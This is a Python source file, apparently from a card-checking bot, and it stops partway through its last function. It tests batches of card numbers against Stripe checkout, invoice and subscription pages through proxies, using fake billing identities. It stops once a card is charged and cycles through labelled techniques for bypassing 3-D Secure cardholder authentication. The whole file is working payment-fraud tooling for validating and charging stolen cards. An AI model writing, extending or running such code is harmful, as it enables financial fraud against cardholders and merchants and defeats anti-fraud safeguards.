import time
import asyncio
import aiohttp
from typing import List
from functions.session import HEADERS
from functions.proxy import get_proxy_url

_charge_session = None

async def get_charge_session(proxy_url: str = None) -> aiohttp.ClientSession:
    """Get or create a session for charging (with connection pooling)"""
    global _charge_session
    if _charge_session is None or _charge_session.closed:
        connector = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=50,
            ttl_dns_cache=300,
            ssl=False,
            enable_cleanup_closed=True
        )
        _charge_session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=15, connect=5)
        )
    return _charge_session

async def close_charge_session():
    """Close the charge session"""
    global _charge_session
    if _charge_session and not _charge_session.closed:
        await _charge_session.close()
        _charge_session = None

async def try_sdk_confirm(
    card: dict,
    pk: str,
    pi_id: str,
    client_secret: str,
    session: aiohttp.ClientSession,
    proxy_url: str = None
) -> dict | None:
    """Try to confirm payment intent directly to bypass SDK 3DS"""
    try:
        confirm_body = (
            f"payment_method_data[type]=card"
            f"&payment_method_data[card][number]={card['cc']}"
            f"&payment_method_data[card][exp_month]={card['month']}"
            f"&payment_method_data[card][exp_year]={card['year']}"
            f"&payment_method_data[card][cvc]={card['cvv']}"
            f"&payment_method_data[billing_details][name]=John Smith"
            f"&expected_payment_method_type=card"
            f"&use_stripe_sdk=true"
            f"&key={pk}"
            f"&client_secret={client_secret}"
        )
        
        async with session.post(
            f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
            headers=HEADERS,
            data=confirm_body,
            proxy=proxy_url
        ) as r:
            resp = await r.json()
        
        if "error" not in resp:
            status = resp.get("status", "")
            if status == "succeeded":
                return {"status": "CHARGED", "response": "SDK Bypass Success"}
            elif status == "processing":
                return {"status": "PROCESSING", "response": "Processing"}
        return None
    except:
        return None

def prepare_checkout_params(init_data: dict) -> dict:
    """Pre-calculate checkout parameters for efficiency"""
    lig = init_data.get("line_item_group")
    inv = init_data.get("invoice")
    
    if lig:
        total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
    elif inv:
        total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
    else:
        pi = init_data.get("payment_intent") or {}
        total = subtotal = pi.get("amount", 0)
    
    cust = init_data.get("customer") or {}
    addr = cust.get("address") or {}
    
    return {
        "email": init_data.get("customer_email") or "john@example.com",
        "checksum": init_data.get("init_checksum", ""),
        "total": total,
        "subtotal": subtotal,
        "name": cust.get("name") or "John Smith",
        "country": addr.get("country") or "US",
        "line1": addr.get("line1") or "476 West White Mountain Blvd",
        "city": addr.get("city") or "Pinetop",
        "state": addr.get("state") or "AZ",
        "zip_code": addr.get("postal_code") or "85929"
    }

async def charge_card_fast(
    card: dict,
    pk: str,
    cs: str,
    params: dict,
    session: aiohttp.ClientSession,
    proxy_url: str = None,
    bypass_3ds: bool = False
) -> dict:
    """Fast single card charge with pre-computed parameters"""
    start = time.perf_counter()
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0
    }
    
    try:
        pm_body = (
            f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
            f"&card[exp_month]={card['month']}&card[exp_year]={card['year']}"
            f"&billing_details[name]={params['name']}&billing_details[email]={params['email']}"
            f"&billing_details[address][country]={params['country']}"
            f"&billing_details[address][line1]={params['line1']}"
            f"&billing_details[address][city]={params['city']}"
            f"&billing_details[address][postal_code]={params['zip_code']}"
            f"&billing_details[address][state]={params['state']}&key={pk}"
        )
        
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=HEADERS,
            data=pm_body,
            proxy=proxy_url
        ) as r:
            pm = await r.json()
        
        if "error" in pm:
            err_msg = pm["error"].get("message", "Card error")
            if "unsupported" in err_msg.lower() or "tokenization" in err_msg.lower():
                result["status"] = "NOT SUPPORTED"
                result["response"] = "Checkout not supported"
            else:
                result["status"] = "DECLINED"
                result["response"] = err_msg
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        pm_id = pm.get("id")
        if not pm_id:
            result["status"] = "FAILED"
            result["response"] = "No PM ID"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        conf_body = (
            f"eid=NA&payment_method={pm_id}&expected_amount={params['total']}"
            f"&last_displayed_line_item_group_details[subtotal]={params['subtotal']}"
            f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
            f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
            f"&last_displayed_line_item_group_details[total_discount_amount]=0"
            f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
            f"&expected_payment_method_type=card&key={pk}&init_checksum={params['checksum']}"
        )
        
        if bypass_3ds:
            conf_body += "&return_url=https://checkout.stripe.com/c/pay/cs_live_complete"
        
        async with session.post(
            f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
            headers=HEADERS,
            data=conf_body,
            proxy=proxy_url
        ) as r:
            conf = await r.json()
        
        if "error" in conf:
            err = conf["error"]
            dc = err.get("decline_code", "")
            msg = err.get("message", "Failed")
            
            if "status of canceled" in msg or "status of expired" in msg:
                result["status"] = "EXPIRED"
                result["response"] = "Checkout session expired or canceled"
            elif "already been used" in msg.lower():
                result["status"] = "USED"
                result["response"] = "Checkout already used"
            else:
                result["status"] = "DECLINED"
                result["response"] = f"{dc.upper()}: {msg}" if dc else msg
        else:
            pi = conf.get("payment_intent") or {}
            st = pi.get("status", "") or conf.get("status", "")
            next_action = pi.get("next_action") or conf.get("next_action")
            
            if st == "succeeded":
                result["status"] = "CHARGED"
                result["response"] = "Payment Successful"
            elif st == "requires_action":
                if bypass_3ds and next_action:
                    action_type = next_action.get("type", "")
                    if action_type == "redirect_to_url":
                        redirect_url = next_action.get("redirect_to_url", {}).get("url", "")
                        if "return_url" in redirect_url or "stripe.com" in redirect_url:
                            result["status"] = "3DS SOFT"
                            result["response"] = "3DS Soft Challenge"
                        else:
                            result["status"] = "3DS SKIP"
                            result["response"] = "3DS Cannot be bypassed"
                    elif action_type == "use_stripe_sdk":
                        pi_data = conf.get("payment_intent") or {}
                        client_secret = pi_data.get("client_secret")
                        pi_id = pi_data.get("id")
                        
                        if client_secret and pi_id:
                            sdk_try = await try_sdk_confirm(
                                card, pk, pi_id, client_secret, session, proxy_url
                            )
                            if sdk_try and sdk_try.get("status") == "CHARGED":
                                result["status"] = "CHARGED"
                                result["response"] = "SDK Bypass Success"
                                result["time"] = round(time.perf_counter() - start, 2)
                                return result
                        
                        result["status"] = "3DS SDK"
                        result["response"] = "3DS SDK Required"
                    else:
                        result["status"] = "3DS"
                        result["response"] = f"3DS: {action_type}"
                else:
                    result["status"] = "3DS"
                    result["response"] = "3DS Required"
            elif st == "requires_payment_method":
                result["status"] = "DECLINED"
                result["response"] = "Card Declined"
            elif st == "processing":
                result["status"] = "PROCESSING"
                result["response"] = "Payment Processing"
            else:
                result["status"] = "UNKNOWN"
                result["response"] = st or "Unknown"
        
        result["time"] = round(time.perf_counter() - start, 2)
        return result
        
    except asyncio.TimeoutError:
        result["status"] = "TIMEOUT"
        result["response"] = "Request Timeout"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = str(e)[:50]
        result["time"] = round(time.perf_counter() - start, 2)
        return result

async def charge_card(
    card: dict,
    checkout_data: dict,
    proxy_str: str = None,
    bypass_3ds: bool = False,
    max_retries: int = 1
) -> dict:
    """Charge a card with retry logic"""
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    
    if not pk or not cs or not init_data:
        return {
            "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
            "status": "FAILED",
            "response": "No checkout data",
            "time": 0
        }
    
    proxy_url = get_proxy_url(proxy_str) if proxy_str else None
    params = prepare_checkout_params(init_data)
    session = await get_charge_session(proxy_url)
    
    for attempt in range(max_retries + 1):
        result = await charge_card_fast(card, pk, cs, params, session, proxy_url, bypass_3ds)
        
        if result["status"] not in ["ERROR", "TIMEOUT"] or attempt >= max_retries:
            return result
        
        await asyncio.sleep(0.5)
    
    return result

async def charge_cards_batch(
    cards: List[dict],
    checkout_data: dict,
    proxy_str: str = None,
    bypass_3ds: bool = False,
    concurrency: int = 3,
    stop_on_charge: bool = True,
    progress_callback = None
) -> List[dict]:
    """Charge multiple cards with controlled concurrency"""
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    
    if not pk or not cs or not init_data:
        return [{
            "card": f"{c['cc']}|{c['month']}|{c['year']}|{c['cvv']}",
            "status": "FAILED",
            "response": "No checkout data",
            "time": 0
        } for c in cards]
    
    proxy_url = get_proxy_url(proxy_str) if proxy_str else None
    params = prepare_checkout_params(init_data)
    session = await get_charge_session(proxy_url)
    
    results = []
    completed_count = 0
    semaphore = asyncio.Semaphore(concurrency)
    stop_flag = asyncio.Event()
    lock = asyncio.Lock()
    
    async def process_card(card: dict, index: int) -> dict:
        nonlocal completed_count
        if stop_flag.is_set():
            return {
                "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
                "status": "SKIPPED",
                "response": "Stopped after charge",
                "time": 0
            }
        
        async with semaphore:
            if stop_flag.is_set():
                return {
                    "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
                    "status": "SKIPPED",
                    "response": "Stopped after charge",
                    "time": 0
                }
            
            result = await charge_card_fast(card, pk, cs, params, session, proxy_url, bypass_3ds)
            
            if bypass_3ds and result["status"] in ["3DS", "3DS SDK", "3DS REQUIRED", "3DS SKIP", "3DS SOFT"]:
                bypass_result = await try_bypass_3ds(card, checkout_data, proxy_str)
                if bypass_result and bypass_result.get("status") in ["CHARGED", "PROCESSING", "DECLINED"]:
                    result = bypass_result
            
            if stop_on_charge and result["status"] == "CHARGED":
                stop_flag.set()
            
            async with lock:
                completed_count += 1
                if progress_callback:
                    try:
                        await progress_callback(completed_count, len(cards), result)
                    except:
                        pass
            
            return result
    
    tasks = [process_card(card, i) for i, card in enumerate(cards)]
    results = await asyncio.gather(*tasks)
    
    return results

async def try_sdk_bypass(
    card: dict,
    checkout_data: dict,
    proxy_str: str = None,
    session: aiohttp.ClientSession = None
) -> dict | None:
    """Try to bypass 3DS SDK by completing payment intent directly"""
    pk = checkout_data.get("pk")
    init_data = checkout_data.get("init_data")
    proxy_url = get_proxy_url(proxy_str) if proxy_str else None
    
    if not session:
        session = await get_charge_session(proxy_url)
    
    pi_data = init_data.get("payment_intent") or {}
    client_secret = pi_data.get("client_secret")
    pi_id = pi_data.get("id")
    
    if not client_secret or not pi_id:
        return None
    
    try:
        confirm_body = (
            f"payment_method_data[type]=card"
            f"&payment_method_data[card][number]={card['cc']}"
            f"&payment_method_data[card][exp_month]={card['month']}"
            f"&payment_method_data[card][exp_year]={card['year']}"
            f"&payment_method_data[card][cvc]={card['cvv']}"
            f"&payment_method_data[billing_details][name]=John Smith"
            f"&expected_payment_method_type=card"
            f"&use_stripe_sdk=true"
            f"&key={pk}"
            f"&client_secret={client_secret}"
        )
        
        async with session.post(
            f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
            headers=HEADERS,
            data=confirm_body,
            proxy=proxy_url
        ) as r:
            resp = await r.json()
        
        if "error" not in resp:
            status = resp.get("status", "")
            if status == "succeeded":
                return {"status": "CHARGED", "response": "SDK Bypass Success"}
            elif status == "processing":
                return {"status": "PROCESSING", "response": "Payment Processing"}
        
        return None
    except:
        return None

async def try_bypass_3ds(
    card: dict,
    checkout_data: dict,
    proxy_str: str = None
) -> dict:
    """Try multiple 3DS bypass techniques"""
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    
    if not pk or not cs or not init_data:
        return {
            "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
            "status": "FAILED",
            "response": "No checkout data",
            "time": 0
        }
    
    proxy_url = get_proxy_url(proxy_str) if proxy_str else None
    params = prepare_checkout_params(init_data)
    session = await get_charge_session(proxy_url)
    
    start = time.perf_counter()
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0,
        "attempts": []
    }
    
    sdk_result = await try_sdk_bypass(card, checkout_data, proxy_str, session)
    if sdk_result and sdk_result.get("status") in ["CHARGED", "PROCESSING"]:
        result["status"] = sdk_result["status"]
        result["response"] = sdk_result["response"]
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    result["attempts"].append({"method": "sdk_direct", "status": "FAILED"})
    
    bypass_configs = [
        {
            "name": "standard",
            "extra_params": ""
        },
        {
            "name": "return_url",
            "extra_params": "&return_url=https://checkout.stripe.com/c/pay/cs_live_complete"
        },
        {
            "name": "frictionless",
            "extra_params": "&return_url=https://checkout.stripe.com"
        },
        {
            "name": "challenge",
            "extra_params": "&return_url=https://checkout.stripe.com/success"
        },
        {
            "name": "off_session",
            "extra_params": "&off_session=true&confirm=true"
        }
    ]
    
    for config in bypass_configs:
        try:
            pm_body = (
                f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
                f"&card[exp_month]={card['month']}&card[exp_year]={card['year']}"
                f"&billing_details[name]={params['name']}&billing_details[email]={params['email']}"
                f"&billing_details[address][country]={params['country']}"
                f"&billing_details[address][line1]={params['line1']}"
                f"&billing_details[address][city]={params['city']}"
                f"&billing_details[address][postal_code]={params['zip_code']}"
                f"&billing_details[address][state]={params['state']}&key={pk}"
            )
            
            async with session.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=HEADERS,
                data=pm_body,
                proxy=proxy_url
            ) as r:
                pm = await r.json()
            
            if "error" in pm:
                result["attempts"].append({"method": config["name"], "status": "PM_ERROR"})
                continue
            
            pm_id = pm.get("id")
            if not pm_id:
                result["attempts"].append({"method": config["name"], "status": "NO_PM"})
                continue
            
            conf_body = (
                f"eid=NA&payment_method={pm_id}&expected_amount={params['total']}"
                f"&last_displayed_line_item_group_details[subtotal]={params['subtotal']}"
                f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                f"&expected_payment_method_type=card&key={pk}&init_checksum={params['checksum']}"
                f"{config['extra_params']}"
            )
            
            async with session.post(
                f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                headers=HEADERS,
                data=conf_body,
                proxy=proxy_url
            ) as r:
                conf = await r.json()
            
            if "error" in conf:
                err = conf["error"]
                dc = err.get("decline_code", "")
                result["attempts"].append({
                    "method": config["name"],
                    "status": "DECLINED",
                    "code": dc
                })
                if dc in ["stolen_card", "lost_card", "fraudulent"]:
                    result["status"] = "DECLINED"
                    result["response"] = f"{dc.upper()}: Card blocked"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                continue
            
            pi = conf.get("payment_intent") or {}
            st = pi.get("status", "") or conf.get("status", "")
            
            if st == "succeeded":
                result["status"] = "CHARGED"
                result["response"] = f"Bypassed via {config['name']}"
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            elif st == "processing":
                result["status"] = "PROCESSING"
                result["response"] = f"Processing via {config['name']}"
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            else:
                result["attempts"].append({
                    "method": config["name"],
                    "status": st or "UNKNOWN"
                })
                
        except Exception as e:
            result["attempts"].append({
                "method": config["name"],
                "status": "ERROR",
                "error": str(e)[:30]
            })
    
    result["status"] = "3DS REQUIRED"
    result["response"] = "All bypass methods failed"
    result["time"] = round(time.perf_counter() - start, 2)
    return result

async def charge_billing_card(
    card: dict,
    billing_data: dict,
    proxy_str: str = None
) -> dict:
    """Charge a card on a Stripe billing/subscription recovery page"""
    start = time.perf_counter()
    card_str = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
    
    result = {
        "card": card_str,
        "status": "FAILED",
        "response": "Unknown error",
        "time": 0
    }
    
    pk = billing_data.get("pk")
    setup_intent = billing_data.get("setup_intent")
    payment_intent = billing_data.get("payment_intent")
    client_secret = billing_data.get("client_secret")
    
    if not pk:
        result["response"] = "No PK found in billing page"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    proxy_url = get_proxy_url(proxy_str) if proxy_str else None
    session = await get_charge_session(proxy_url)
    
    try:
        pm_body = (
            f"type=card"
            f"&card[number]={card['cc']}"
            f"&card[exp_month]={card['month']}"
            f"&card[exp_year]={card['year']}"
            f"&card[cvc]={card['cvv']}"
            f"&billing_details[name]=John Smith"
            f"&billing_details[address][country]=US"
            f"&billing_details[address][postal_code]=85935"
            f"&key={pk}"
        )
        
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=HEADERS,
            data=pm_body,
            proxy=proxy_url
        ) as r:
            pm_resp = await r.json()
        
        if "error" in pm_resp:
            error_msg = pm_resp["error"].get("message", "Card error")
            result["status"] = "DECLINED"
            result["response"] = error_msg[:100]
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        pm_id = pm_resp.get("id")
        if not pm_id:
            result["response"] = "No payment method ID"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        if setup_intent and client_secret:
            confirm_body = (
                f"payment_method={pm_id}"
                f"&key={pk}"
                f"&client_secret={client_secret}"
            )
            
            async with session.post(
                f"https://api.stripe.com/v1/setup_intents/{setup_intent}/confirm",
                headers=HEADERS,
                data=confirm_body,
                proxy=proxy_url
            ) as r:
                resp = await r.json()
            
            if "error" in resp:
                error_msg = resp["error"].get("message", "Card error")
                decline_code = resp["error"].get("decline_code", "")
                code = resp["error"].get("code", "")
                
                if decline_code or "decline" in error_msg.lower() or "insufficient" in error_msg.lower():
                    result["status"] = "DECLINED"
                    result["response"] = f"{decline_code.upper() if decline_code else code}: {error_msg}"[:100]
                elif "3d_secure" in error_msg.lower() or "authentication" in error_msg.lower():
                    result["status"] = "3DS"
                    result["response"] = error_msg[:100]
                else:
                    result["status"] = "DECLINED"
                    result["response"] = error_msg[:100]
            else:
                status = resp.get("status", "")
                if status == "succeeded":
                    result["status"] = "CHARGED"
                    result["response"] = "Subscription recovered"
                elif status == "processing":
                    result["status"] = "PROCESSING"
                    result["response"] = "Processing"
                elif status == "requires_action":
                    next_action = resp.get("next_action", {})
                    action_type = next_action.get("type", "")
                    if action_type == "redirect_to_url":
                        result["status"] = "3DS"
                        result["response"] = "3DS redirect required"
                    elif action_type == "use_stripe_sdk":
                        result["status"] = "3DS"
                        result["response"] = "3DS SDK required"
                    else:
                        result["status"] = "3DS"
                        result["response"] = f"3DS: {action_type}" if action_type else "3DS required"
                elif status == "requires_payment_method":
                    result["status"] = "DECLINED"
                    result["response"] = "Card declined"
                else:
                    result["status"] = "UNKNOWN"
                    result["response"] = f"Status: {status}"
            
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        elif payment_intent and client_secret:
            confirm_body = (
                f"payment_method_data[type]=card"
                f"&payment_method_data[card][number]={card['cc']}"
                f"&payment_method_data[card][exp_month]={card['month']}"
                f"&payment_method_data[card][exp_year]={card['year']}"
                f"&payment_method_data[card][cvc]={card['cvv']}"
                f"&payment_method_data[billing_details][name]=John Smith"
                f"&payment_method_data[billing_details][address][country]=US"
                f"&payment_method_data[billing_details][address][postal_code]=85935"
                f"&expected_payment_method_type=card"
                f"&use_stripe_sdk=true"
                f"&key={pk}"
                f"&client_secret={client_secret}"
            )
            
            async with session.post(
                f"https://api.stripe.com/v1/payment_intents/{payment_intent}/confirm",
                headers=HEADERS,
                data=confirm_body,
                proxy=proxy_url
            ) as r:
                resp = await r.json()
            
            if "error" in resp:
                error_msg = resp["error"].get("message", "Card error")
                decline_code = resp["error"].get("decline_code", "")
                code = resp["error"].get("code", "")
                
                if decline_code or "decline" in error_msg.lower() or "insufficient" in error_msg.lower():
                    result["status"] = "DECLINED"
                    result["response"] = f"{decline_code or code}: {error_msg}"[:100]
                elif "3d_secure" in error_msg.lower() or "authentication" in error_msg.lower():
                    result["status"] = "3DS"
                    result["response"] = error_msg[:100]
                else:
                    result["status"] = "DECLINED"
                    result["response"] = error_msg[:100]
            else:
                status = resp.get("status", "")
                if status == "succeeded":
                    result["status"] = "CHARGED"
                    result["response"] = "Payment confirmed"
                elif status == "processing":
                    result["status"] = "PROCESSING"
                    result["response"] = "Processing"
                elif status == "requires_action":
                    result["status"] = "3DS"
                    result["response"] = "3DS required"
                else:
                    result["status"] = "DECLINED"
                    result["response"] = f"Status: {status}"
            
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        else:
            token_body = (
                f"card[number]={card['cc']}"
                f"&card[exp_month]={card['month']}"
                f"&card[exp_year]={card['year']}"
                f"&card[cvc]={card['cvv']}"
                f"&card[name]=John Smith"
                f"&card[address_country]=US"
                f"&card[address_zip]=85935"
                f"&key={pk}"
            )
            
            async with session.post(
                "https://api.stripe.com/v1/tokens",
                headers=HEADERS,
                data=token_body,
                proxy=proxy_url
            ) as r:
                token_resp = await r.json()
            
            if "error" in token_resp:
                error_msg = token_resp["error"].get("message", "Card error")
                decline_code = token_resp["error"].get("decline_code", "")
                code = token_resp["error"].get("code", "")
                
                if decline_code:
                    result["status"] = "DECLINED"
                    result["response"] = f"{decline_code}: {error_msg}"[:100]
                elif "incorrect" in error_msg.lower() or "invalid" in error_msg.lower():
                    result["status"] = "DECLINED"
                    result["response"] = f"{code}: {error_msg}"[:100]
                elif "expired" in error_msg.lower():
                    result["status"] = "DECLINED"
                    result["response"] = f"expired_card: {error_msg}"[:100]
                elif "cvc" in error_msg.lower():
                    result["status"] = "DECLINED"
                    result["response"] = f"incorrect_cvc: {error_msg}"[:100]
                else:
                    result["status"] = "DECLINED"
                    result["response"] = error_msg[:100]
                
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            
            token_id = token_resp.get("id")
            card_brand = token_resp.get("card", {}).get("brand", "").upper()
            card_last4 = token_resp.get("card", {}).get("last4", "")
            card_funding = token_resp.get("card", {}).get("funding", "")
            cvc_check = token_resp.get("card", {}).get("cvc_check", "")
            
            if not token_id:
                result["status"] = "DECLINED"
                result["response"] = "Could not create token"
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            
            source_body = (
                f"type=card"
                f"&token={token_id}"
                f"&usage=reusable"
                f"&key={pk}"
            )
            
            async with session.post(
                "https://api.stripe.com/v1/sources",
                headers=HEADERS,
                data=source_body,
                proxy=proxy_url
            ) as r:
                source_resp = await r.json()
            
            if "error" in source_resp:
                error_msg = source_resp["error"].get("message", "Source error")
                decline_code = source_resp["error"].get("decline_code", "")
                code = source_resp["error"].get("code", "")
                
                if decline_code or "decline" in error_msg.lower():
                    result["status"] = "DECLINED"
                    result["response"] = f"{decline_code or code}: {error_msg}"[:100]
                elif "3d_secure" in error_msg.lower() or "authentication" in error_msg.lower():
                    result["status"] = "3DS"
                    result["response"] = error_msg[:100]
                else:
                    result["status"] = "DECLINED"
                    result["response"] = error_msg[:100]
                
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            
            source_status = source_resp.get("status", "")
            three_d_secure = source_resp.get("card", {}).get("three_d_secure", "")
            
            if source_status == "chargeable":
                if three_d_secure == "required":
                    result["status"] = "3DS"
                    result["response"] = f"3DS Required | {card_brand} {card_funding} ...{card_last4}"
                elif three_d_secure == "recommended":
                    result["status"] = "3DS SOFT"
                    result["response"] = f"3DS Recommended | {card_brand} {card_funding} ...{card_last4}"
                else:
                    result["status"] = "LIVE"
                    result["response"] = f"Card Valid | {card_brand} {card_funding} ...{card_last4} | CVC: {cvc_check}"
            elif source_status == "pending":
                result["status"] = "3DS"
                result["response"] = f"Pending 3DS | {card_brand} ...{card_last4}"
            elif source_status == "failed":
                result["status"] = "DECLINED"
                result["response"] = f"Source failed | {card_brand} ...{card_last4}"
            else:
                result["status"] = "LIVE"
                result["response"] = f"{source_status} | {card_brand} {card_funding} ...{card_last4}"
            
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
    except asyncio.TimeoutError:
        result["status"] = "TIMEOUT"
        result["response"] = "Request timeout"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = str(e)[:50]
        result["time"] = round(time.perf_counter() - start, 2)
        return result

async def charge_invoice_card(
    card: dict,
    invoice_data: dict,
    proxy_str: str = None
) -> dict:
    """Charge a card on a Stripe invoice page"""
    start = time.perf_counter()
    card_str = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
    
    result = {
        "card": card_str,
        "status": "FAILED",
        "response": "Unknown error",
        "time": 0
    }
    
    pk = invoice_data.get("pk")
    payment_intent = invoice_data.get("payment_intent")
    client_secret = invoice_data.get("client_secret")
    
    if not pk:
        result["response"] = "No PK found in invoice page"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    if not payment_intent or not client_secret:
        result["response"] = "No payment intent found in invoice"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    proxy_url = get_proxy_url(proxy_str) if proxy_str else None
    session = await get_charge_session(proxy_url)
    
    try:
        confirm_body = (
            f"payment_method_data[type]=card"
            f"&payment_method_data[card][number]={card['cc']}"
            f"&payment_method_data[card][exp_month]={card['month']}"
            f"&payment_method_data[card][exp_year]={card['year']}"
            f"&payment_method_data[card][cvc]={card['cvv']}"
            f"&payment_method_data[billing_details][name]=John Smith"
            f"&payment_method_data[billing_details][address][country]=US"
            f"&payment_method_data[billing_details][address][postal_code]=85935"
            f"&expected_payment_method_type=card"
            f"&client_secret={client_secret}"
            f"&key={pk}"
        )
        
        async with session.post(
            f"https://api.stripe.com/v1/payment_intents/{payment_intent}/confirm",
            headers=HEADERS,
            data=confirm_body,
            proxy=proxy_url
        ) as r:
            resp = await r.json()
        
        if "error" in resp:
            error_msg = resp["error"].get("message", "Card error")
            decline_code = resp["error"].get("decline_code", "")
            code = resp["error"].get("code", "")
            
            if decline_code or "decline" in error_msg.lower() or "insufficient" in error_msg.lower():
                result["status"] = "DECLINED"
                result["response"] = f"{decline_code.upper() if decline_code else code}: {error_msg}"[:100]
            elif "3d_secure" in error_msg.lower() or "authentication" in error_msg.lower():
                result["status"] = "3DS"
                result["response"] = error_msg[:100]
            else:
                result["status"] = "DECLINED"
                result["response"] = error_msg[:100]
        else:
            status = resp.get("status", "")
            if status == "succeeded":
                result["status"] = "CHARGED"
                result["response"] = "Invoice paid"
            elif status == "processing":
                result["status"] = "PROCESSING"
                result["response"] = "Processing"
            elif status == "requires_action":
                next_action = resp.get("next_action", {})
                action_type = next_action.get("type", "")
                if action_type == "redirect_to_url":
                    result["status"] = "3DS"
                    result["response"] = "3DS redirect required"
                elif action_type == "use_stripe_sdk":
                    result["status"] = "3DS"
                    result["response"] = "3DS SDK required"
                else:
                    result["status"] = "3DS"
                    result["response"] = f"3DS: {action_type}" if action_type else "3DS required"
            elif status == "requires_payment_method":
                result["status"] = "DECLINED"
                result["response"] = "Card declined"
            else:
                result["status"] = "UNKNOWN"
                result["response"] = f"Status: {status}"
        
        result["time"] = round(time.perf_counter() - start, 2)
        return result
        
    except asyncio.TimeoutError:
        result["status"] = "TIMEOUT"
        result["response"] = "Request timeout"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = str(e)[:50]
        result["time"] = round(time.perf_counter() - start, 2)
        return result

async def charge_cs_direct(card: dict, cs: str, pk: str, proxy_str: str = None) -> dict:
    """Charge a card directly using CS and PK (for Payment Links without init_data)"""
    start = time.perf_counter()
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": "DECLINED",
        "message": None,
        "response": None,
        "time": 0
    }
    
    if not cs or not pk:
        result["message"] = "No CS or PK provided"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    proxy_url = get_proxy_url(proxy_str) if proxy_str else None
    session = await get_charge_session(proxy_url)
    
    try:
        pm_body = (
            f"type=card"
            f"&card[number]={card['cc']}"
            f"&card[exp_month]={card['month']}"
            f"&card[exp_year]={card['year']}"
            f"&card[cvc]={card['cvv']}"
            f"&billing_details[name]=John Smith"
            f"&billing_details[email]=test@example.com"
            f"&billing_details[address][country]=US"
            f"&billing_details[address][postal_code]=85935"
            f"&key={pk}"
        )
        
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=HEADERS,
            data=pm_body,
            proxy=proxy_url
        ) as r:
            pm_resp = await r.json()
        
        if "error" in pm_resp:
            err = pm_resp["error"]
            result["message"] = err.get("message", "PM creation failed")[:100]
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        pm_id = pm_resp.get("id")
        if not pm_id:
            result["message"] = "No PM ID returned"
            result["time"] = round(time.perf_counter() - start, 2)
            return result
        
        confirm_body = (
            f"eid=NA"
            f"&payment_method={pm_id}"
            f"&expected_payment_method_type=card"
            f"&key={pk}"
        )
        
        async with session.post(
            f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
            headers=HEADERS,
            data=confirm_body,
            proxy=proxy_url
        ) as r:
            resp = await r.json()
        
        if "error" in resp:
            error_msg = resp["error"].get("message", "Error")
            decline_code = resp["error"].get("decline_code", "")
            code = resp["error"].get("code", "")
            
            if decline_code or "decline" in error_msg.lower() or "insufficient" in error_msg.lower():
                result["status"] = "DECLINED"
                result["message"] = f"{decline_code.upper() if decline_code else code}: {error_msg}"[:100]
            elif "3d_secure" in error_msg.lower() or "authentication" in error_msg.lower():
                result["status"] = "3DS"
                result["message"] = error_msg[:100]
            else:
                result["status"] = "DECLINED"
                result["message"] = f"{code}: {error_msg}"[:100]
        else:
            status = resp.get("status", "")
            if status == "succeeded" or resp.get("success"):
                result["status"] = "CHARGED"
                result["message"] = "Payment successful"
            elif status == "requires_action":
                result["status"] = "3DS"
